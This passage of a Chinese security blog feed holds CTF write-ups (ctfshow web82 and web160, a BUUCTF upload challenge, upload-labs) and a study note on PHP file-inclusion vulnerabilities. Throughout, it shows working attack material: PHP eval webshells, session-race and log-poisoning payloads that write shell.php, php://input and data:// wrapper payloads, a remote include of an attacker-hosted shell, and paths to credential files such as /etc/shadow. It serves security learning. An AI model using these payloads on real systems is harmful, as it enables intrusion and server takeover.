title="文件读取"></a>文件读取</h3><p>PHP中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp目录下</p><p>默认文件名是phpXXXXXX，文件名最后6个字符是随机的大小写字母</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">./<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><span class="hljs-string">?通</span>配符，可以匹配到./tmp/phpXXXXXX，能匹配到的东西太多，通常会报错<br><br>./<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span>[@-[]<br>[@-[]表示<span class="hljs-variable constant_">ASCII</span>在@和[之间的字符，也就是大写字母，保障最后一位位大写字母<br></code></pre></td></tr></table></figure><p>具体实现步骤：</p><p>一：先构造一个文件上传的POST数据包；</p><p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p><p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p><p>四：在上传的文件中写入一句话木马，把木马生成位置指定一个绝对路径，直接执行；</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-87.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">payload:</span><br><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`.+/???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br>插入url编码，除了<span class="hljs-title class_">Host</span>其他部分直接修改<br></code></pre></td></tr></table></figure><p>图中的做法是输出一句话木马语句然后写入到success.php文件中</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web82</title>
      <link href="/2025/01/29/ctfshow-web82/"/>
      <url>/2025/01/29/ctfshow-web82/</url>
      
        <content type="html"><![CDATA[<p>首先代码审计，发现基本都被过滤了，但是这里可以利用 session 对话进行文件包含，通过条件竞争实现</p><p><img src="/../image/ctfshow-web82-1.png"></p><p>原理：我们在Cookie里设置 PHPSESSID&#x3D;test,php，HP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_test，但是对于默认配置 session.upload_progress.cleanup &#x3D; on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。</p><hr><p>首先用html写一个文件上传框</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://79cfbdc5-5bf6-48ff-b2ef-24c4535dc377.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>其中value&#x3D;“xxx” 其实就是我们的 payload，这里我们写上能生成一句话木马文件的代码<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1])?&gt;&#39;);?&gt;</code>，而action&#x3D;”xxx”，即我们题目地址</p><p>打开页面，随便上传一个文件</p><p><img src="/../image/ctfshow-web82-2.png"></p><p>抓包之后放到攻击模块，然后在Cookie：添加PHPSESSID&#x3D;exp（自定义），如果没有Cookie自行添加</p><p><img src="/../image/ctfshow-web82-3.png"></p><p>接下来就是条件竞争的常规操作，无payload上传攻击和访问攻击</p><p>访问攻击地址为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-regexp">/tmp/sess</span>_exp<br></code></pre></td></tr></table></figure><p>因为Cookie 里设置了 PHPSESSID&#x3D;exp，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_exp。</p><p>经过条件竞争当我们成功访问到该文件后，就会将该文件包含，竞争成功写入一句话木马</p><p>然后用蚁剑连接shell.php即可，密码为1</p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞总结</title>
      <link href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞概述<br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><pre><code>require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</code></pre><p>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。比如我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用</p><h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p><p>（1）使用绝对路径</p><p>使用绝对路径直接读取:</p><p>（2）使用相对路径进行读取</p><p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p><p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p><pre><code>C:\boot.ini //查看系统版本C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件C:\windows\repair\sam //存储Windows系统初次安装的密码C:\ProgramFiles\mysql\my.ini //Mysql配置C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码C:\windows\php.ini //php配置信息</code></pre><p>Linux&#x2F;Unix系统:</p><pre><code>/etc/password //账户信息/etc/shadow //账户密码信息/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置/usr/local/app/php5/lib/php.ini //PHP相关配置/etc/httpd/conf/httpd.conf //Apache配置文件/etc/my.conf //mysql配置文件</code></pre><h3 id="本地文件包含漏洞利用"><a href="#本地文件包含漏洞利用" class="headerlink" title="本地文件包含漏洞利用"></a>本地文件包含漏洞利用</h3><h4 id="配合文件上传使用"><a href="#配合文件上传使用" class="headerlink" title="配合文件上传使用"></a>配合文件上传使用</h4><p>比如有时我们无法绕过文件上传，不能上传webshell，可以先上传一个图片格式的webshell到服务器内，然后再利用本地文件包含漏洞去解析我们的图片格式的webshell</p><p>实例：</p><p>upload靶场pass-15</p><p><a href="https://mixbp.github.io/2025/01/22/upload/">https://mixbp.github.io/2025/01/22/upload/</a></p><h4 id="包含Apache或nginx日志文件"><a href="#包含Apache或nginx日志文件" class="headerlink" title="包含Apache或nginx日志文件"></a>包含Apache或nginx日志文件</h4><h5 id="日志介绍"><a href="#日志介绍" class="headerlink" title="日志介绍"></a>日志介绍</h5><p>日志是记录系统或应用程序运行时事件的文件。这些记录可以包括错误信息、用户活动、系统性能指标等，帮助开发者和管理员监控和排查问题。</p><p>日志通常会记录多种内容，包括：</p><pre><code>时间戳：事件发生的具体时间。用户代理（UA）头：浏览器或客户端的类型和版本。IP地址：发起请求的用户的IP地址。请求方法：如GET、POST等。请求路径：被访问的资源URL。响应状态码：服务器对请求的响应状态（如200、404等）。用户行为：如点击、表单提交等。</code></pre><h5 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h5><p>在Apache中，默认日志路径通常是：</p><pre><code>访问日志：/var/log/apache2/access.log（Debian/Ubuntu）错误日志：/var/log/apache2/error.log（Debian/Ubuntu）</code></pre><p>在NGINX中，默认日志路径通常是：</p><pre><code>访问日志：/var/log/nginx/access.log错误日志：/var/log/nginx/error.log</code></pre><p>具体路径可能因系统配置而异。</p><h5 id="文件上传日志包含概述"><a href="#文件上传日志包含概述" class="headerlink" title="文件上传日志包含概述"></a>文件上传日志包含概述</h5><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">步骤：</span><br><span class="language-xml">首先判断是apache服务器还是nginx服务器（抓返回包查看sever头）</span><br><span class="language-xml">上传一个正常的图片，把UA头修改为后门代码，从而将它写入日志</span><br><span class="language-xml">    上传图片，内容写入恶意代码：包含日志文件。</span><br><span class="language-xml">    利用.user.ini将图片中代码包含入upload下的php文件</span><br><span class="language-xml"></span><br><span class="language-xml">这样造成的结果就是：该php文件中就会包含日志内容，也就包含了后门代码</span><br><span class="language-xml">例如：</span><br><span class="language-xml">ctfshow-web入门文件上传-160</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">注意：这里log被过滤所以使用字符连接绕过</span><br><span class="language-xml"></span><br><span class="language-xml">也可利用日志包含写入木马 </span><br><span class="language-xml">例如：</span><br><span class="language-xml">?file=/var/log/nginx/access.log&amp;1=fputs(fopen(%27shell.php%27,%27w%27),%27</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;mixbp&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">%27);</span><br><span class="language-xml"></span><br><span class="language-xml">这里ua头改为</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>实例：</p><p>ctfshow-web入门文件上传-160</p><p><a href="https://mixbp.github.io/2025/01/26/ctfshow-web160/">https://mixbp.github.io/2025/01/26/ctfshow-web160/</a></p><h4 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h4><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p><strong>利用条件:</strong></p><ul><li>找到Session内的可控变量</li><li>Session文件可读写，并且知道存储路径</li></ul><p>session常见存储路径:</p><pre><code>/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。</code></pre><p>实例：</p><p>ctfshow-web文件包含-82</p><p><a href="https://mixbp.github.io/2025/01/29/ctfshow-web82/">https://mixbp.github.io/2025/01/29/ctfshow-web82/</a></p><h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p><p>常用方法：</p><p>1.配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p><p>2.通过条件竞争当临时文件未被删除时，包含该临时文件</p><h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p><p>例如：</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/phpinfo.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>源码没有对$path做任何过滤，所以存在文件包含漏洞</p><p>在远端Web服务器&#x2F;site&#x2F;目录下创建一个shell.php文件，利用漏洞去读取文件，内含一句话木马</p><p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p><p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">访问远端Web服务器的shell.php文件：<br><span class="hljs-number">127.0.0.1</span>/include.php?path=xxx.xxx.xxx.xx/site/shell.php?<span class="hljs-number">123123</span><br></code></pre></td></tr></table></figure><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数，需要配合文件包含使用</p><p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-1.png"></p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p><p>用法：file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p><h3 id="php-协议（fliter-input）"><a href="#php-协议（fliter-input）" class="headerlink" title="php:&#x2F;&#x2F;协议（fliter||input）"></a>php:&#x2F;&#x2F;协议（fliter||input）</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p><p>php:&#x2F;&#x2F;filter用法：</p><p>我们利用文件包含去打开一个php文件，无法直接将代码显示在页面上，但是可以使用php:&#x2F;&#x2F;filter</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=文件路径<br><br>如果php被过滤，使用大小写混用绕过，以下伪协议都可<br>?<span class="hljs-built_in">file</span>=PhP://<span class="hljs-built_in">filter</span><br></code></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;input用法：</p><p>利用该方法可以直接写入php文件，现在url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//大小写混用绕过</span><br>?file=PhP:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p>发送报文，用蚁剑连接即可</p><h3 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><pre><code>zip://中只能传入绝对路径。要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）只需要是zip的压缩包即可，后缀名可以任意更改。相同的类型还有zlib://和bzip2://</code></pre><p>zip:&#x2F;&#x2F;协议用法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">例如：<br>zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://<span class="hljs-symbol">D</span>:\<span class="hljs-number">1.</span>zip<span class="hljs-comment">%23phpinfo.txt</span><br></code></pre></td></tr></table></figure><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p><strong>ata:&#x2F;&#x2F;</strong> 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><p>利用data:&#x2F;&#x2F;伪协议可以达到直接执行php代码的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ，">?file=data://text/plain,&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;);?&gt;<br>?file=data://text/plain,&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;<br>//如果此处对特殊字符进行了过滤，还可以通过base64代码编码后再输入<br>data://text/plain;base64,编码后的代码<br><br>//如果此处&quot;php&quot;被过滤，可以使用大小写混用绕过<br>?file=data://text/plain,&lt;?PhP @eval($_POST[&quot;mixbp&quot;])?&gt;<br></code></pre></td></tr></table></figure><h3 id="伪协议利用条件和方法"><a href="#伪协议利用条件和方法" class="headerlink" title="伪协议利用条件和方法"></a>伪协议利用条件和方法</h3><p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-2.png"></p><p>详解地址：<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ctfshow]web160</title>
      <link href="/2025/01/26/ctfshow-web160/"/>
      <url>/2025/01/26/ctfshow-web160/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/ctfshow-web160-1.png"></p><p>经过测试发现这题禁用了很多字符,&#96;&#96;{}()[];，查了之后才知道这题涉及到了日志包含。</p><p>步骤：</p><p>首先上传我们的.user.ini文件，写上<code>auto_prepend_file=mixbp.png</code>，这可以让我们的mixbp.png内的代码包含进upload文件夹下的php文件，但是这里会有前端验证，直接上传是不行的先改后缀.png，然后抓包后修改</p><p><img src="/../image/ctfshow-web160-2.png"></p><p>上传成功，还可在重放器中查看返回包，发现服务器为nginx</p><p><img src="/../image/ctfshow-web160-3.png"></p><p>接着上传我们的mixbp.png文件里面写了日志包含代码，注意这里的log被过滤了所以使用字符拼接绕过<code>&lt;=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>，</p><p><img src="/../image/ctfshow-web160-4.png"></p><p>然后我们访问upload下的index.php文件并拦截请求，修改ua头</p><p><img src="/../image/ctfshow-web160-5.png"></p><p>然后使用get传参?1&#x3D;system(“tac ..&#x2F;flag.php”);即可得到flag，（这里使用伪协议直接读取也行）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;tac ../flag.php&quot;</span>)<span class="hljs-comment">; 时，程序将：</span><br><br>访问父目录中的 flag.php 文件。<br>以反向顺序打印该文件的内容到控制台<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-web160-6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 日志包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf极客大挑战upload</title>
      <link href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"/>
      <url>/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/buuctf-upload-1.png"></p><p>打开发现是一个文件上传，这里直接试试上传我们的一句话木马，显示</p><p><img src="/../image/buuctf-upload-2.png"></p><p>我们抓个包看看，能抓到包，说明在后端验证，我们修改content-type为image&#x2F;jpeg试试，显示</p><p><img src="/../image/buuctf-upload-3.png"></p><p>php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht，我们这里试试，发现phtml可以用但是又给我们显示</p><p><img src="/../image/buuctf-upload-4.png"></p><p>也就是说过滤掉了&lt;?，所以可以用不含&lt;?的一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;mixbp&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是不行</p><p><img src="/../image/buuctf-upload-5.png"></p><p>猜测这里应该是对图片头进行了校验，在我们的一句话木马前添加图片头GIF89a，添加三个占位符然后使用hex修改也可</p><p><img src="/../image/buuctf-upload-6.png"></p><p>上传成功</p><p><img src="/../image/buuctf-upload-7.png"></p><p>用蚁剑连接，终端输入cat&#x2F;flag即可</p><p><img src="/../image/buuctf-upload-8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 做题笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/2025/01/22/upload/"/>
      <url>/2025/01/22/upload/</url>
      
        <content type="html"><![CDATA[<p><img src="/../image/upload-0.png"></p><h2 id="pass-01-js绕过"><a href="#pass-01-js绕过" class="headerlink" title="pass-01-js绕过"></a>pass-01-js绕过</h2><p><img src="/../image/upload-pass01-1.png"></p><p><img src="/../image/upload-pass01-2.png"></p><p>发现如果文件是php格式，会被拦截，且抓包抓不到东西，所以判断是前端js拦截</p><p>将文件格式改为jpg然后上传，并抓包</p><p><img src="/../image/upload-pass01-3.png"><img src="/../image/upload-pass01-4.png"></p><p>这样就绕过前端验证了</p><p>拦截后将格式修改回php并放包</p><p><img src="/../image/upload-pass01-5.png"></p><p>发现已经上传成功了，使用蚁剑连接试试</p><p><img src="/../image/upload-pass01-6.png"></p><p>右键复制图片链接并在蚁剑中测试连接出现连接成功</p><p><img src="/../image/upload-pass01-7.png"></p><p>第二种方法：</p><p>直接在浏览器中禁用所有js代码</p><p>先打开开发者工具，然后点击右上角设置按钮</p><p><img src="/../image/upload-pass01-8.png"></p><p>停用javascript然后直接上传php文件即可</p><p><img src="/../image/upload-pass01-9.png"></p><p>第三种方法：</p><p>检查前端js代码</p><p>查看代码发现上传表单绑定了一个js</p><p><img src="/../image/upload-pass01-10.png"></p><p>js代码</p><p><img src="/../image/upload-pass01-11.png"></p><p>直接修改return true即可</p><p><img src="/../image/upload-pass01-12.png"></p><h2 id="pass-02-content-type绕过"><a href="#pass-02-content-type绕过" class="headerlink" title="pass-02-content-type绕过"></a>pass-02-content-type绕过</h2><p><img src="/../image/upload-pass02-1.png"></p><p>同样上传php文件，显示文件类型不正确，请重新上传，并且可以抓到包，所以判断验证是在后端进行的</p><p><img src="/../image/upload-pass02-2.png"></p><p>用bp抓包并把文件类型改为image&#x2F;jpeg</p><p><img src="/../image/upload-pass02-3.png"></p><p>上传成功</p><p><img src="/../image/upload-pass02-4.png"></p><h2 id="pass-03-特殊后缀绕过"><a href="#pass-03-特殊后缀绕过" class="headerlink" title="pass-03-特殊后缀绕过"></a>pass-03-特殊后缀绕过</h2><p>直接上传php文件，发现能够抓到包，所以判断验证是在后端进行的</p><p><img src="/../image/upload-pass03-1.png"></p><p>在传入php文件时，发现它提示不允许上传这些后缀文件传.asp,.aspx,.php,.jsp后缀文件,检查源码也发现这些</p><p>php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht</p><p>直接抓包然后直接把php后缀名改为php3</p><p><img src="/../image/upload-pass03-2.png"></p><p>上传成功</p><p><img src="/../image/upload-pass03-3.png"></p><p>但是这里用蚁剑无法连接，说是Apache服务器不对php3以php格式解析，要修改配置文件。</p><h2 id="pass-04-htaccess绕过"><a href="#pass-04-htaccess绕过" class="headerlink" title="pass-04-.htaccess绕过"></a>pass-04-.htaccess绕过</h2><p><img 